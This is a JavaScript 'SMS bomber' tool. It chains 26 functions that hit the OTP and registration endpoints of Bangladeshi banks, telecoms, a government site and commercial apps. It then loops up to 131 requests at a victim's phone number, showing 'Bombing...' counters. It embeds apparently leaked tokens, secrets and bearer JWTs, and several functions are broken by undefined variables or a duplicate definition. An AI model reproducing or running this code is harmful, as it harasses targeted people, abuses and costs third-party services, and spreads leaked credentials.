async function api_1(phone) {
    const data = {
        "countryId": "19",
        "mobileNumber": phone,
        "purpose": "registration"
    };

    try {
        const response = await fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'authorization': 'Otp bnVsbA=='
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 1 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 1 Error:', error);
        throw error;
    }
}

async function api_2(phone) {
    const url = `https://chinaonlineapi.com/api/v1/get/otp?phone=${phone}`;

    try {
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                'token': 'gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219',
                'Origin': 'https://chinaonlinebd.com',
                'Referer': 'https://chinaonlinebd.com/'
            }
        });

        const result = await response.json();

       
        if (result.status === 'Failed' || result.msg.includes('OTP limit exceeded')) {
            throw new Error(`API 2 Failure: ${result.msg || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 2 Error:', error);
        throw error;
    }
}

async function api_3(phone) {
    const url = "https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/108.0',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ "phoneNumber": "+88" + phone })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 3 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 3 Error:', error);
        throw error;
    }
}

async function api_4(phone) {
    const url = "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ number: phone })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 4 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 4 Error:', error);
        throw error;
    }
}

async function api_5(phone) {
    const url = "https://user-api.jslglobal.co:444/v1/send-otp";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)',
            'Origin': 'https://rental.jatri.co',
            'Referer': 'https://rental.jatri.co/'
            },
            body: new URLSearchParams({
            phone: `+88${phone}`,
            jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 5 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 5 Error:', error);
        throw error;
    }
}

async function api_6(phone) {
    const url = "https://gw.jotno.net/auth/login/token";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            },
            body: JSON.stringify({ username: phone })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 6 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 6 Error:', error);
        throw error;
    }
}

async function api_7(phone) {
 const data = {
 mobile: '+88-' + phone,
 deviceToken: 'app',
 language: 'bn',
 os: 'android'
 };
    try {
        const response = await fetch('https://api.osudpotro.com/api/v1/users/send_otp', {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 7 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 7 Error:', error);
        throw error;
    }
}

async function api_8(phone) {
 const data = {
 full_name: "Hangama",
 company_name: "Hangama",
 email_address: "hangama@gmail.com",
 phone_number: phone
 };
    try {
        const response = await fetch('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 8 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 8 Error:', error);
        throw error;
    }
}

async function api_9(phone) {
    const url = "https://developer.quizgiri.xyz/api/v2.0/send-otp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
            },
            body: JSON.stringify({
            country_code: "+880",
            phone: phone
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 9 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 9 Error:', error);
        throw error;
    }
}

async function api_10(phone) {
    const url = "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'Content-Length': JSON.stringify({
            country_code: "+88",
            phone: phone
            }).length
            },
            body: JSON.stringify({
            country_code: "+88",
            phone: phone
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 10 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 10 Error:', error);
        throw error;
    }
}

        async function api_11(phone) {
 const data = {
 phone: phone,
 type: 'student',
 auth_type: 'signup',
 vendor: 'shikho'
 };
    try {
        const response = await fetch('https://api.shikho.com/auth/v2/send/sms', {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
           'Accept': 'application/json, text/plain, */*',
           'Origin': 'https://app.shikho.com',
           'Referer': 'https://app.shikho.com/'
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 11 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 11 Error:', error);
        throw error;
    }
}

async function api_12(phone) {
 const data = {
 "Operation": "CreateSubscription",
 "MobileNumber": "88" + phone,
 "PackageID": 100,
 "Secret": "HJKX71%UHYH"
 };
    try {
        const response = await fetch('https://api.toybox.live/bdapps_handler.php', {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 12 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 12 Error:', error);
        throw error;
    }
}

async function api_12(phone) {
 const data = new URLSearchParams({
 phone: '+88' + phone,
 jatri_token: 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'
 });
    try {
        const response = await fetch('https://user-api.jslglobal.co/v1/send-otp', {
            method: 'POST',
           headers: {
           'User-Agent': 'okhttp/3.9',
           'Content-Type': 'application/x-www-form-urlencoded',
           },
           body: data
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 12 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 12 Error:', error);
        throw error;
    }
}

async function api_13(phone) {
 const data = {
 phone: phone,
 language: 1
 };
 
    try {
        const response = await fetch('https://api.betonbook.com/api/v5/auth/otp/request', {
            method: 'POST',
           headers: {
           "Content-Type": "application/json"
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 14 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 13 Error:', error);
        throw error;
    }
}

async function api_14(phone) {
 const data = {
 "msisdn": "88" + phone
 };
 
    try {
        const response = await fetch('https://applink.com.bd/appstore-v4-server/login/otp/request', {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0',
           'Referer': 'https://applink.com.bd/',
           'Origin': 'https://applink.com.bd'
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 14 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 14 Error:', error);
        throw error;
    }
}

async function api_15(phone) {
    const url = "https://webapi.robi.com.bd/v1/send-otp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjE4MSwibmJmIjoxNjkyNjQyMTgxLCJleHAiOjE2OTI2NDU3ODEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.zIjqAeTCI-kFmH5nTuAII1HzQISfOLOyLfYH4FlcjXA',
            'Content-Type': 'application/json'
            },
            body: JSON.stringify({
            phone_number: phone,
            type: 'my_offer'
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 15 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 15 Error:', error);
        throw error;
    }
}

async function api_16(phone) {
    const url = "https://webapi.robi.com.bd/v1/account/register/otp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0'
            },
            body: JSON.stringify({
            phone_number: phone
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 16 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 16 Error:', error);
        throw error;
    }
}

async function api_17(phone) {
    const url = "https://softmaxmanager.xyz/api/v1/user/request/otp/";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'user-agent': 'Dart/3.4 (dart:io)',
            'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
            'accept-encoding': 'gzip',
            'authorization': 'Basic c29zOjI3TTMjYTRz',
            'host': 'softmaxmanager.xyz'
            },
            body: new URLSearchParams({
            'phone_number': '+88' + phone_number,
            'app_signature': 'Fu89B%2BdY9dz'
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 17 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 17 Error:', error);
        throw error;
    }
}

async function api_18(phone) {
    const url = "https://training.gov.bd/backoffice/api/user/sendOtp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
           headers: {
           'Host': 'training.gov.bd',
           'Connection': 'keep-alive',
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
           'Origin': 'https://training.gov.bd',
           'Referer': 'https://training.gov.bd/signup',
           'Accept-Encoding': 'gzip, deflate, br',
           'Accept-Language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7'
           },
           body: JSON.stringify({
           mobile: mobile
           })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 18 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 18 Error:', error);
        throw error;
    }
}
async function api_19(phone) {
    const url = "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'Referer': 'https://doctime.com.bd/',
           'Origin': 'https://doctime.com.bd',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
           },
           body: JSON.stringify({
           data: {
           flag: 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
           code: '88',
           contact_no: phoneNumber,
           country_calling_code: '88',
           headers: {
           PlatForm: 'Web'
           }
           }
           })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 19 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 19 Error:', error);
        throw error;
    }
}
async function api_20(phone) {
    const url = "https://core.easy.com.bd/api/v1/registration";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
           'Referer': 'https://easy.com.bd/'
           },
           body: JSON.stringify({
           "name": "Shahidul Islam",
           "email": "uyrlhkgxqw@emergentvillage.org",
           "mobile": phone,
           "password": "boss#2022",
           "password_confirmation": "boss#2022",
           "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"
           })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 20 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 20 Error:', error);
        throw error;
    }
}
async function api_21(phone) {
const data = {
    type: "phone",
    phone: phone
           };

 
    try {
        const response = await fetch('https://eshop-api.banglalink.net/api/v1/customer/send-otp', {
            method: 'POST',
           headers: {
           "Content-Type": "application/json",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 21 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 21 Error:', error);
        throw error;
    }
}

async function api_22(phone) {
    const data = {
        type: "phone",
        phone: phone
    };

    try {
       
        const response = await fetch(`https://app.hishabee.business/api/V2/otp/send?mobile_number=${phone}`, {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                'Content-Type': 'application/json',
                'Content-Length': '0'
            }
        });

        const result = await response.json();

       
        if (result.status === 'failed') {
            throw new Error(`API 22 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 22 Error:', error);
        throw error;
    }
}

async function api_23(phone) {
    const url = `https://www.skitto.com/replace-sim/sent-otp/${phone}`;

    try {
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
            }
        });

        const result = await response.json();

        if (result.status === 'Failed' || result.msg.includes('OTP limit exceeded')) {
            throw new Error(`API 23 Failure: ${result.msg || 'Unknown error'}`);
        }
 return result;
    } catch (error) {
        console.error('API 23 Error:', error);
        throw error;
    }
}

async function api_24(phone) {
    const url = "https://da-api.robi.com.bd/da-nll/otp/send";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json'
           },
           body: JSON.stringify({
           msisdn: phone
           })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 24 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 24 Error:', error);
        throw error;
    }
}

async function api_25(phone) {
    const url = "https://api.chardike.com/api/otp/send"; // Ã Â¦Â¨Ã Â¦Â¤Ã Â§ÂÃ Â¦Â¨ URL

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                phone: phone, 
                otp_type: "login" 
            })
        });

        const result = await response.json();

        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 25 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 25 Error:', error);
        throw error;
    }
}


async function api_26(phone) {
const data = {
   "phoneNumber": phone
         };

 
    try {
        const response = await fetch('https://api.apex4u.com/api/auth/login', {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0'
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 26 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 26 Error:', error);
        throw error;
    }
}

const apis = [
            { func: api_1, limit: 1, count: 0 },
            { func: api_2, limit: 1, count: 0 },
            { func: api_3, limit: 1, count: 0 },
            { func: api_4, limit: 1, count: 0 },
            { func: api_5, limit: 1, count: 0 },
            { func: api_6, limit: 1, count: 0 },
            { func: api_8, limit: 1, count: 0 },
            { func: api_9, limit: 1, count: 0 },
            { func: api_10, limit: 1, count: 0 },
            { func: api_11, limit: 1, count: 0 },
            { func: api_12, limit: 1, count: 0 },
            { func: api_13, limit: 5, count: 0 },
            { func: api_14, limit: 5, count: 0 },
            { func: api_15, limit: 5, count: 0 },
            { func: api_16, limit: 5, count: 0 },
            { func: api_17, limit: 10, count: 0 },
            { func: api_18, limit: 10, count: 0 },
            { func: api_19, limit: 10, count: 0 },
            { func: api_20, limit: 10, count: 0 },
            { func: api_21, limit: 10, count: 0 },
            { func: api_22, limit: 10, count: 0 },
            { func: api_23, limit: 10, count: 0 },
            { func: api_24, limit: 10, count: 0 },
            { func: api_25, limit: 10, count: 0 },
            { func: api_26, limit: 10, count: 0 },
         
        ];

        function canCallApis(count) {
            const totalLimit = apis.reduce((acc, api) => acc + api.limit, 0);
            return totalLimit >= count;
        }

        function validateNumber(number) {
            const phoneRegex = /^01\d{9}$/;
            return phoneRegex.test(number);
        }

        function validateAmount(amount) {
            return amount > 0 && amount <= 131;
        }

        function showMessage(type, text) {
            const messageDiv = document.getElementById('result');
            messageDiv.className = `message ${type}`;
            messageDiv.textContent = text;
            messageDiv.classList.add('show');
            setTimeout(() => messageDiv.classList.remove('show'), 3000);
        }

async function startmainProcess() {
    const button = document.querySelector('button');
    const inputs = document.querySelectorAll('input');
    const number = document.getElementById('number').value;
    const amount = parseInt(document.getElementById('amount').value);
    const totalLimit = apis.reduce((acc, api) => acc + api.limit, 0);

    if (Array.from(inputs).every(input => input.value.trim() !== '')) {
        if (!validateNumber(number)) {
            showMessage('error', 'Please enter a valid number.');
            return;
        }

        if (!validateAmount(amount)) {
            showMessage('error', 'Please enter a valid amount (maximum 131).');
            return;
        }

        if (canCallApis(amount)) {
            button.style.display = 'none';

            let successCount = 0;
            let failureCount = 0;

            for (let i = 0; i < amount; i++) {
                const availableApis = apis.filter(api => api.count < api.limit);
                if (availableApis.length === 0) {
                    break;
                }

                const apiIndex = i % availableApis.length;
                const currentApi = availableApis[apiIndex];

                try {
                    if (currentApi.count >= currentApi.limit) {
                        throw new Error('API limit exceeded');
                    }

                    const response = await currentApi.func(number);

                    if (!response || 
                        response.status === 'Failed' || 
                        response.otpsent === 'false' || 
                        response.error || 
                        response.message?.includes('limit exceeded')) {
                        throw new Error(`API Failure: ${response.msg || response.error || 'Unknown error'}`);
                    }

                    currentApi.count += 1;
                    successCount += 1;
                    const text = `
                        Bombing...<br>
                        Success: ${successCount}<br>
                        Failure: ${failureCount}<br>
                    `;
                    const messageDiv = document.getElementById('result');
                    messageDiv.className = `message success`;
                    messageDiv.innerHTML = text;
                    messageDiv.style.display = 'block';

                } catch (error) {
                    failureCount += 1;
                    const text = `
                        Bombing...<br>
                        Success: ${successCount}<br>
                        Failure: ${failureCount}<br>
                    `;
                    const messageDiv = document.getElementById('result');
                    messageDiv.className = `message error`;
                    messageDiv.innerHTML = text;
                    messageDiv.style.display = 'block';
                }
            }

            apis.forEach(api => api.count = 0);
            button.style.display = 'inline-block';
            const text = `
                        Bombing Stop<br>
                        Success: ${successCount}<br>
                        Failure: ${failureCount}<br>
                    `;
                    const messageDiv = document.getElementById('result');
                    messageDiv.className = `message error`;
                    messageDiv.innerHTML = text;
                    messageDiv.style.display = 'block';
        } else {
            showMessage('error', 'Please enter a valid amount (maximum '+ totalLimit +').');
        }
    } else {
        showMessage('error', 'Please fill in all fields.');
    }
}

const blockList = ["01634670276", "01648469912"]; // Include relevant blocked IDs
function startProcess() {
const number = document.getElementById('number').value;
if (blockList.includes(String(number))) { // Convert chatId to a string if necessary
                    const messageDiv = document.getElementById('result');
                    messageDiv.className = `message error`;
                    messageDiv.innerHTML = "Sorry, you cannot send sms bombing to this number. please enter another phone number.";
                    messageDiv.style.display = 'block';
} else {
    startmainProcess(); // Ensure this is called correctly
}
}
function back() {
  window.history.back();
}